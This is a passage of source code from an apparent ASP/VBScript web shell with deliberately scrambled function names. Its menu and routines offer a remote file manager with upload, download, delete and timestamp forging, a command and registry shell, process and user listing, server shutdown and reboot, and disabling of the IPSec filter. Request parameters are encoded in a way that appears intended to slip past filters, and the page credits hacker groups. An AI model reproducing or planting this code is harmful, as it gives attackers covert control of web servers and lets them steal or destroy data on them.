echo"<center>"
ltvq"60%"
ztlif False
xze"acxze","dlagb"
abywz 1
doTd "Turn off server","80%"
ncxl "Do it","20%"
igl
zro
ztlif False
xze"acxze","reset"
abywz 0
doTd"Reset server",""
ncxl "Do it",""
igl
zro
ztlif False
xze"acxze","xcnu"
abywz 1
doTd "Disable TCP/IP filter",""
ncxl "Do it",""
igl
zro
xlvqe
echo"</center>"
Select Case acxze
Case "dlagb"
For Each sefc In dkb
If sefc.Shutdown()=0 Then
zhv"Shuting computer,fuck off!"
Else
zhv"Shut computer fail-_-!"
End If
Next
Case "reset"
For Each sefc In dkb
If sefc.Reboot()=0 Then
zhv"Restarting computer,connect later..."
Else
zhv"Restart computer fail-_-!"
End If
Next
Case "xcnu"
Set rrf=zsckm.ExecQuery("select * from Win32_NetworkAda"&dkp&"pterConfiguration where IPEnabled ='True'")
For Each umj In rrf
dised=umj.DisableIPSec()
If dised=0 Or dised=1 Then
zhv"IP filter disable succeed!You need to restart server to make it effective."
Else
zhv"IP filter disable fail-_-!"
End If
Next
End Select
End Sub
Sub fpx(ivv)
%>
<html>
<head>
<title><%=xacj%></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.main{width:100%;padding:20px 20px 20px 20px;}
.hidehref{font:12px Arial,Tahoma;color:#646464;}
.input{font:12px Arial,Tahoma;background:#fff;height:20px;BORDER-WIDTH:1px;}
.text{font:12px Arial,Tahoma;background:#fff;BORDER-WIDTH:1px;}
.frame{font:12px Arial,Tahoma;border:1px solid #ddd;width:100%;height:400px;padding:1px;}
.tdInput{font:12px Arial,Tahoma;background:#fff;padding:1px;height:20px;BORDER-WIDTH:1px;width:100%;}
.text{font:12px Arial,Tahoma;background:#fff;padding:1px;}
.tdText{font:12px Arial,Tahoma;background:#fff;padding:1px;width:100%;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
a{color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.link td{border-top:1px solid #fff;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;height:28px}
.alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;height:28px}
.focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ddddff;padding:2px 10px 2px 5px;height:28px}
.head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#e0e0e0;padding:5px 10px 5px 5px;font-weight:bold;}
.headSpan{border-top:1px solid #fff;margin:2;background:#e0e0e0;width:100%;}
form{margin:0;padding:0;}
.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:3px 5px 5px 5px;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:50%;margin-right:10px;}
label{font:12px Arial,Tahoma;float:left;width:25%;}
</style>
<script language="javascript">
function uxbp(str){
return escape(str);
}
</script>
<script language="vbscript">
Function rfeef(obj)
If obj.style.display="none"Then
obj.style.display=""
Else
obj.style.display="none"
End If
End Function
Function adwba(coqk,nfr,Str)
On Error Resume Next
Dim cagc
actForm.goaction.value=coqk
actForm.acxze.value=nfr
If coqk="bbr" And Str<>"" And InStr(Str,":\")<1 Then Str=woaee.value&Str
If coqk="kqmyb" And Str<>"" And InStr(Str,"HKEY_")<>1 Then Str=form1.ndie.value&"\"&Str
actForm.puvgw.value=rsdx(Str)
Select Case nfr
Case"tngdz"
upform.action="<%=ykzg%>?goaction="&coqk&"&acxze="&nfr&"&vqsbz="&uxbp(rsdx(upform.vqsbz.value))&"&igiqh="&uxbp(Mid(upform.file.Value,InstrRev(upform.file.Value,"\")+1))
If upform.xxyj.checked Then
upform.action=upform.action&"&xxyj=1"
End If
upform.submit()
Case"vihy","ewvk","ejgn","tbqwf","wsf","nhlnt","rsri"
Select Case nfr
Case"ejgn","ewvk"
cagc=InputBox("Move to :","Move",Left(Str,InstrRev(Str,"\")))
Case"tbqwf","vihy"
cagc=InputBox("Copy to :","Copy",Left(Str,InstrRev(Str,"\")))
Case"wsf","nhlnt"
cagc=InputBox("Rename as :","Rename",Mid(Str,InstrRev(Str,"\")+1))
If nfr="wsf"Then
Do While InStr(cagc,".")<1 And cagc<>""
cagc=InputBox("Invalid file name format!","Rename","")
Loop
End If
Case Else
cagc=InputBox("Modify as :","Modify time","")
End Select
If cagc=""Then Exit Function
actForm.puvgw.value=rsdx(Str&"|"&cagc)
actForm.submit()
Case"oql","sgqly"
If Window.confirm("Delete?Are you sure?")Then actForm.submit()
Case"dxc","pppau"
If Window.confirm("Delete?Are you sure?")Then actForm.submit()
Case Else
actForm.submit()
End Select
End Function
Function rsdx(xdl)
If Not <%=zvhy%> Or xdl=""Then
rsdx=xdl
Exit Function
End If
Dim tt,odyzj
tt=""
For i=1 To Len(xdl)
odyzj=Mid(xdl,i,1)
If Asc(odyzj)<128 And Asc(odyzj)>0 then
tt=tt&Asc(odyzj)+<%=ybd%>&"<%=miih%>"
Else
tt=tt&odyzj&"<%=miih%>"
End If
Next
rsdx=Left(tt,Len(tt)-1)
End Function
Function vscms(nedsl)
On Error Resume Next
Dim pamArr
pamArr=Split("<%=xdl%>","|")
For Each strPam In pamArr
On Error Resume Next:Execute nedsl&"."&strPam&".value=rsdx("&nedsl&"."&strPam&".value)"
Next
End Function
Function argnp()
cmdResult.document.body.innerHTML="<form name=frm method=post action='?'><input type=hidden name=goaction value='<%=goaction%>' /><input type=hidden name='acxze' value='viewResult'/><input type=hidden name='rrr' value='"&rsdx(form1.rrr.value)&"'/></form>"
cmdResult.document.frm.submit()
End Function
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all;"bgcolor="#fafafa">
<table width="100%"border="0"cellpadding="0"cellspacing="0">
<tr class="head">
<td style="width:30%"><br><%=gbba("LOCAL_ADDR")&"("&xnqtl&")"%></td>
<td align="center" style="width:40%"><br>
<b><%adutj xacj,"#0099FF","3"%></b><br>
</td>
<td style="width:30%"align="right"><%=jck()%></td>
</tr>
<form id="actForm"method="post"action="<%=ykzg%>">
<input type="hidden" id="goaction" name="goaction" value="">
<input type="hidden" id="acxze" name="acxze" value="">
<input type="hidden" id="puvgw" name="puvgw" value="">
</form>
<tr class="link">
<td colspan="3">
<a href="javascript:adwba('bbr','','');">FSO File</a> |
<a href="javascript:adwba('lmwgb','','');">IIS Spy(Adsi)</a> |
<a href="javascript:adwba('umh','','');">IIS Spy(WMI)</a> |
<a href="javascript:adwba('pmy','','');">Cmd Shell</a> |
<a href="javascript:adwba('kqmyb','','');">Reg Shell</a> |
<a href="javascript:adwba('ulxbb','','');">Service List</a> |
<a href="javascript:adwba('jdwtp','','');">Process List</a> |
<a href="javascript:adwba('ukpy','','');">User List</a> |
<a href="javascript:adwba('xpodw','','');">DataSource List</a> |
<a href="javascript:adwba('xcngn','','');">Some others...</a>
</td>
</tr>
</table><div class="main"><br>
<%
echo"<b>"
adutj ivv&" &raquo;","#0099ff","2"
eedi"</b><br><br>"
End Sub
Function tortz(vqsbz)
Set objCountFile=dut.OpenTextFile(vqsbz,1,True)
tortz=objCountFile.ReadAll
objCountFile.Close
Set objCountFile=Nothing
End Function
Function zhxc(vqsbz)
Dim kodwq
If Not qjr Then On Error Resume Next
Set kodwq=mfmq("Adodb.Stream")
With kodwq
.Type=2
.Mode=3
.Open
.LoadFromFile vqsbz
.Charset="utf-8"
.Position=2
zhxc=.ReadText()
.Close
End With
Set kodwq=Nothing
End Function
Sub vtyjq(vqsbz,spmh)
Dim theFile
Set theFile=dut.OpenTextFile(vqsbz,2,True)
theFile.Write spmh
theFile.Close
Set theFile=Nothing
End Sub
Sub oooeu(vqsbz,spmh)
Dim kodwq
If Not qjr Then On Error Resume Next
Set kodwq=mfmq("Adodb.Stream")
With kodwq
.Type=2
.Mode=3
.Open
.Charset="utf-8"
.WriteText spmh
.SavetoFile vqsbz,2
.Close
End With
Set kodwq=Nothing
End Sub
Sub vwsrt()
If Not qjr Then On Error Resume Next
If mhve="file"Then
vqsbz=vqsbz&"\"&yug
Call dut.CreateTextFile(vqsbz,False)
wqj
Else
dut.CreateFolder(vqsbz&"\"&yug)
End If
If Err Then
smeb(Err)
Else
zhv"File/folder created"
End If
End Sub
Sub mgxnb()
Dim etzij,advu,ooz,mxq
If Not qjr Then On Error Resume Next
vqsbz=lgk(puvgw,"|",False)
etzij=smfap(puvgw,"|")
If InStr(vqsbz,"\")<1 Then vqsbz=vqsbz&"\"
Dim theFile,fileName,aqwr
If vqsbz=""Or etzij=""Then
zhv"Parameter wrong!"
Exit Sub
End If
If strFileMethod="fso"Then
If acxze="renamefolder"Then
Set aqwr=dut.GetFolder(vqsbz)
aqwr.Name=etzij
Set aqwr=Nothing
Else
Set theFile=dut.GetFile(vqsbz)
theFile.Name=etzij
Set theFile=Nothing
End If
Else
mxq=smfap(vqsbz,"\")
ooz=lgk(vqsbz,"\",False)
Set advu=erd.NameSpace(ooz)
Set objItem=advu.ParseName(mxq)
objItem.Name=etzij
End If
If Err Then
smeb(Err)
Else
zhv"Rename completed"
End If
End Sub
Sub vuh()
If Not qjr Then On Error Resume Next
If acxze="sgqly"Then
Call dut.DeleteFolder(vqsbz,True)
Else
Call dut.DeleteFile(vqsbz,True)
End If
If Len(vqsbz)=2 Then vqsbz=vqsbz&"\"
If Err Then
smeb(Err)
Else
zhv"File/folder deleted"
End If
End Sub
Sub jreg()
Dim ylkbe,zyn,bpavi,egcb,kcos
If Not qjr Then On Error Resume Next
vqsbz=Left(puvgw,Instr(puvgw,"|")-1)
zyn=Mid(puvgw,InStr(puvgw,"|")+1)
If vqsbz=""Or zyn=""Then
zhv"Parameter wrong!"
Exit Sub
End If
If Right(zyn,1)<>"\"Then zyn=zyn&"\"
Select Case acxze
Case"vihy"
Call dut.CopyFolder(vqsbz,zyn)
Case"tbqwf"
Call dut.CopyFile(vqsbz,zyn)
Case"ewvk"
Call dut.MoveFolder(vqsbz,zyn)
Case"ejgn"
Call dut.MoveFile(vqsbz,zyn)
End Select
If Err Then
smeb(Err)
Else
zhv"File/folder copyed/moved"
End If
End Sub
Sub rsri()
Dim sdxpm,argbp,wruwd,clagp
If Not qjr Then On Error Resume Next
vqsbz=Left(puvgw,Instr(puvgw,"|")-1)
If Right(vqsbz,1)="\"And Len(vqsbz)>3 Then vqsbz=Left(vqsbz,Len(vqsbz)-1)
argbp=smfap(vqsbz,"\")
wruwd=Mid(puvgw,Instr(puvgw,"|")+1)
vqsbz=lgk(vqsbz,"\",False)
Set clagp=erd.NameSpace(vqsbz)
Set sdxpm=clagp.ParseName(argbp)
If wruwd<>""Then
If IsDate(wruwd) Then sdxpm.ModifyDate=wruwd
End If
If Err Then
smeb(Err)
Else
zhv"Time modiffied"
End If
Set sdxpm=Nothing
Set clagp=Nothing
End Sub
Sub qws()
Response.Clear
If Not qjr Then On Error Resume Next
Dim kodwq,fileName,kpmtb
fileName=smfap(vqsbz,"\")
Set kodwq=mfmq("Adodb.Stream")
kodwq.Open
kodwq.Type=1
kodwq.LoadFromFile(vqsbz)
smeb(Err)
session.CodePage=936
Response.AddHeader"Content-Disposition","Attachment; Filename="&fileName
session.CodePage=65001
Response.AddHeader"Content-Length",kodwq.Size
Response.ContentType="Application/Octet-Stream"
Response.BinaryWrite kodwq.Read
Response.Flush()
kodwq.Close
Set kodwq=Nothing
End Sub
Sub uvrs()
If Not qjr Then On Error Resume Next
Dim i,j,info,srh,theFile,fileName,spmh
If InstrRev(vqsbz,".")<InstrRev(vqsbz,"\") Then
If Right(vqsbz,1)<>"\"Then vqsbz=vqsbz&"\"
vqsbz=vqsbz&igiqh
End If
If InStr(vqsbz,":")<1 Then vqsbz=vqt&"\"&vqsbz
Set kodwq=mfmq("Adodb.Stream")
Set srh=mfmq("Adodb.Stream")
With kodwq
.Type=1
.Mode=3
.Open
.Write Request.BinaryRead(Request.TotalBytes)
.Position=0
spmh=.Read()
i=InStrB(spmh,chrB(13)&chrB(10))
info=LeftB(spmh,i-1)
i=Len(info)+2
i=InStrB(i,spmh,chrB(13)&chrB(10)&chrB(13)&chrB(10))+4-1
j=InStrB(i,spmh,info)-1
srh.Type=1
srh.Mode=3
srh.Open
kodwq.position=i
.CopyTo srh,j-i-2
If xxyj=1 Then
srh.SavetoFile vqsbz,2
Else
srh.SavetoFile vqsbz
End If
If Err Then
smeb(Err)
Else
zhv"File uploaded"
End If
srh.Close
.Close
End With
Set kodwq=Nothing
Set srh=Nothing
End Sub
Function rsdx(xdl)
If Not zvhy Or xdl=""Then
rsdx=xdl
Exit Function
End If
Dim tt,odyzj
tt=""
For i=1 To Len(xdl)
odyzj=Mid(xdl,i,1)
If Asc(odyzj)<128 And Asc(odyzj)>0 then
tt=tt&Asc(odyzj)+ybd&miih
Else
tt=tt&odyzj&miih
End If
Next
rsdx=Left(tt,Len(tt)-1)
End Function
Function wdhw(jtd)
If Not zvhy Or jtd=""Then
wdhw=jtd
Exit Function
End If
Dim dd,ofetm
dd=""
ofetm=Split(jtd,miih)
For i=0 To UBound(ofetm)
If IsNumeric(ofetm(i))Then
dd=dd&Chr(CInt(ofetm(i))-ybd)
Else
dd=dd&ofetm(i)
End If
Next
wdhw=dd
End Function
Function jck()
Dim bdyaf,pylll,vhjdi
pylll=88
vhjdi=31
bdyaf="<br>"
bdyaf=bdyaf&"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | "
bdyaf=bdyaf&"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | "
bdyaf=bdyaf&"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | "
bdyaf=bdyaf&"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>"
jck=bdyaf
End Function
Function gbba(str)
gbba=Request.ServerVariables(str)
End Function
Function mfmq(frije)
Set mfmq=Server.CreateObject(frije)
End Function
Function dtwz(frije)
Set dtwz=GetObject(frije)
End Function
Function qtyi(str)
qtyi=server.urlencode(str)
End Function
Function pjaq(str)
Dim yyz,ewfcm
yyz=""
For i=0 To Len(str)-1
ewfcm=Right(str,Len(str)-i)
If Asc(ewfcm)<16 Then yyz=yyz&"0"
yyz=yyz&CStr(Hex(Asc(ewfcm)))
Next
pjaq="0x"&yyz
End Function
Function pxxk(str)
Dim yyz,ewfcm
yyz=""
For i=0 To Len(str)-1
ewfcm=Right(str,Len(str)-i)
yyz=yyz&CStr(Hex(Asc(ewfcm)))&"00"
Next
pxxk="0x"&yyz
End Function
Function htmlEncode(str)
str=vresz(str)
str=Replace(str,Chr(13)&Chr(10),"<br>")
htmlEncode=Replace(str," ","&nbsp;")
End Function
Function vresz(str)
If str=""Or IsNull(str)Then
vresz=""
Exit Function
End If
vresz=Server.HtmlEncode(str)
End Function
Function dhh(str)
dhh=Server.MapPath(str)
End Function
Sub smeb(Err)
If Err Then
zhv"Exception :"&Err.Description
zhv"Exception source :"&Err.Source
Err.Clear
End If
End Sub
Function utzvg(ByVal str)
str=Replace(str,"\","\\")
utzvg=Replace(str,"\\\\","\\")
End Function
Function lgk(str,pnux,qxqyo)
If str="" Or InStr(str,pnux)<1 Then
lgk=""
Exit Function
End If
If qxqyo Then
lgk=Left(str,InStr(str,pnux)-1)
Else
lgk=Left(str,InstrRev(str,pnux)-1)
End If
End Function
Function smfap(str,pnux)
If str="" Or InStr(str,pnux)<1 Then
smfap=""
Exit Function
End If
smfap=Mid(str,InstrRev(str,pnux)+Len(pnux))
End Function
Sub echo(str)
Response.Write str
End Sub
Sub eedi(str)
echo str&vbCrLf
End Sub
Sub iquhg(frije,opns)
echo"<a href=""javascript:rfeef("&frije&")"" class=""hidehref"">"&frije&" :</a>"
echo"<span id="&frije
If opns Then echo" style='display:none;'"
eedi">"
End Sub
Sub adutj(str,color,size)
echo"<font color="""&color&""""
If size<>""Then echo" size="""&size&""""
eedi">"&str&"</font>"
End Sub
Sub ltvq(width)
eedi"<table width="""&width&"""border=""0""cellpadding=""0""cellspacing=""0"">"
End Sub
Sub xlvqe()
eedi"</table>"
End Sub
Sub abywz(num)
echo"<tr class='alt"&num&"' onmouseover=""javascript:this.className='focusTr';"" onmouseout=""javascript:this.className='alt"&num&"';"">"
End Sub
Sub xjnn(num)
echo"<span class='alt"&num&"Span'>"
End Sub
Sub ztlif(zvhy)
echo"<form method=""post"" id=""form"&nedsl&""" action="""&ykzg&""""
If zvhy Then echo" onSubmit=""javascript:vscms('form"&nedsl&"')"""
eedi">"
xze"goaction",goaction
nedsl=nedsl+1
End Sub
Sub zro()
eedi"</form>"
End Sub
Sub ncxl(value,width)
echo"<td style=""width:"&width&""">"
echo"<input type=""submit"" value="""&value&""" class=""bt"">"
eedi"</td>"
End Sub
Sub snqs(str,color,size)
echo"<td>"
adutj str,color,size
eedi"</td>"
End Sub
Sub tygwb()
echo"<tr class='link'>"
End Sub
Sub igl()
eedi"</tr>"
End Sub
Sub doTd(td,width)
If IsObject(td)Or td=""Or IsNull(td) Then td="<font color=""red"">Null</font>"
echo"<td"
If width<>""Then echo" width='"&width&"'"
echo">"
echo td
eedi"</td>"
End Sub
Sub pwbon(td,width)
If IsNull(td) Then td="<font color=""red"">Null</font>"
doTd td,width
End Sub
Sub pisa(wdi,name,value,size,uko)
Dim cls
If wdi="button"Or wdi="submit"Or wdi="reset"Then
cls="bt"
Else
cls="input"
End If
eedi"<input type="""&wdi&""" name="""&name&""" id="""&name&""" value="""&vresz(value)&""" size="""&size&""" class="""&cls&""" "&uko&">"
End Sub
Sub xze(name,value)
echo"<input type=""hidden"" name="""&name&""" id="""&name&""" value="""&value&""">"
End Sub
Sub luhhh(wdi,name,value,width,uko,span)
Dim cls
If wdi="button"Or wdi="submit"Or wdi="reset"Then
cls="bt"
Else
cls="tdInput"
End If
If span=""Then span=1
echo"<td colspan="&span&" style=""width:"&width&""">"
echo"<input type="""&wdi&""" name="""&name&""" id="""&name&""" value="""&vresz(value)&""" class="""&cls&""" "&uko&">"
eedi"</td>"
End Sub
Sub adwba(value)
eedi"<input type=""submit"" value="""&value&""" class=""bt"">"
End Sub
Sub cuuu(name,value,rows)
echo"<td>"
pvrd name,value,"100%",rows," class=""tdText"""
eedi"</td>"
End Sub
Sub asby(str)
If Not qjr Then On Error Resume Next
If IsNull(str)Then str="<font color=red>Null<font>"
echo"<td nowrap>"&str&"</td>"
End Sub
Sub pvrd(name,value,width,rows,uko)
echo"<textarea name="""&name&""" id="""&name&""" style=""width:"&width&";"" rows="""&rows&""" class=""text"" "&uko&">"
echo vresz(value)
eedi"</textarea>"
End Sub
Sub jqsb()
echo"<ul class=""info"">"
End Sub
Sub uxzf(name,width,uko)
eedi"<select style=""width:"&width&""" name="""&name&""" "&uko&">"
End Sub
Sub fndid()
eedi"</select>"
End Sub
Sub zepw(value,str)
eedi"<option value="""&value&""">"&str&"</option>"
End Sub
Sub uuuk()
jozsz=jozsz+1
If jozsz>=2 Then jozsz=0
End Sub
Sub cutw(str)
eedi"<label>"&str&"</label>"
End Sub
Sub zhv(str)
wbk=wbk&"<li>"&str&"</li>"
End Sub
Sub duhsb(Err)
If Err Then
smeb(Err)
sbbo
End If
End Sub
Function nopx(str,fehmw)
blhvq.Pattern=fehmw
nopx=blhvq.Test(str)
End Function
Function mgl(str,fehmw,gbriw)
If gbriw Then fehmw=phfbl(fehmw)
blhvq.Pattern=fehmw
Set mgl=blhvq.Execute(str)
End Function
Function bnb(str,fehmw,poc,gbriw)
If gbriw Then fehmw=phfbl(fehmw)
blhvq.Pattern=fehmw
bnb=blhvq.Replace(str,poc)
End Function
Function phfbl(str)
str=Replace(str,"\","\\")
str=Replace(str,".","\.")
str=Replace(str,"?","\?")
str=Replace(str,"+","\+")
str=Replace(str,"(","\(")
str=Replace(str,")","\)")
str=Replace(str,"*","\*")
str=Replace(str,"[","\[")
str=Replace(str,"]","\]")
phfbl=str
End Function
%>